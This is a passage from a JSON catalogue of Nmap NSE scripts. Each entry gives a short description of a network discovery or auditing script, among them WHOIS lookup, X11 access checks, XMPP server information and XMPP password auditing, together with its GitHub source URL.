    "description": "Queries the WHOIS services of Regional Internet Registries (RIR) and attempts to retrieve information about the IP Address\nAssignment which contains the Target IP Address.\n\nThe fields displayed contain information about the assignment and the organisation responsible for managing the address\nspace. When output verbosity is requested on the Nmap command line (<code>-v</code>) extra information about the assignment will\nbe displayed.\n\nTo determine which of the RIRs to query for a given Target IP Address this script utilises Assignments Data hosted by IANA.\nThe data is cached locally and then parsed for use as a lookup table.  The locally cached files are refreshed periodically\nto help ensure the data is current.  If, for any reason, these files are not available to the script then a default sequence\nof Whois services are queried in turn until: the desired record is found; or a referral to another (defined) Whois service is\nfound; or until the sequence is exhausted without finding either a referral or the desired record.\n\nThe script will recognize a referral to another Whois service if that service is defined in the script and will continue by\nsending a query to the referred service.  A record is assumed to be the desired one if it does not contain a referral.\n\nTo reduce the number unnecessary queries sent to Whois services a record cache is employed and the entries in the cache can be\napplied to any targets within the range of addresses represented in the record.\n\nIn certain circumstances, the ability to cache responses prevents the discovery of other, smaller IP address assignments\napplicable to the target because a cached response is accepted in preference to sending a Whois query.  When it is important\nto ensure that the most accurate information about the IP address assignment is retrieved the script argument <code>whodb</code>\nshould be used with a value of <code>\"nocache\"</code> (see script arguments).  This reduces the range of addresses that may use a\ncached record to a size that helps ensure that smaller assignments will be discovered.  This option should be used with caution\ndue to the potential to send large numbers of whois queries and possibly be banned from using the services.\n\nIn using this script your IP address will be sent to iana.org. Additionally\nyour address and the address of the target of the scan will be sent to one of\nthe RIRs.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "wsdd-discover.nse",
    "description": "Retrieves and displays information from devices supporting the Web\nServices Dynamic Discovery (WS-Discovery) protocol. It also attempts\nto locate any published Windows Communication Framework (WCF) web\nservices (.NET 4.0 or later).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "x11-access.nse",
    "description": "Checks if you're allowed to connect to the X server.\n\nIf the X server is listening on TCP port 6000+n (where n is the display\nnumber), it is possible to check if you're able to get connected to the\nremote display by sending a X11 initial connection request.\n\nIn reply, the success byte (0x00 or 0x01) will determine if you are in\nthe <code>xhost +</code> list. In this case, script will display the message:\n<code>X server access is granted</code>.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "xdmcp-discover.nse",
    "description": "Requests an XDMCP (X display manager control protocol) session and lists supported authentication and authorization mechanisms.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "xmlrpc-methods.nse",
    "description": "Performs XMLRPC Introspection via the system.listMethods method.\n\nIf the verbosity is > 1 then the script fetches the response\nof system.methodHelp for each method returned by listMethods.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "xmpp-brute.nse",
    "description": "Performs brute force password auditing against XMPP (Jabber) instant messaging servers.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "xmpp-info.nse",
    "description": "Connects to XMPP server (port 5222) and collects server information such as:\nsupported auth mechanisms, compression methods, whether TLS is supported\nand mandatory, stream management, language, support of In-Band registration,\nserver capabilities.  If possible, studies server vendor.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  }
]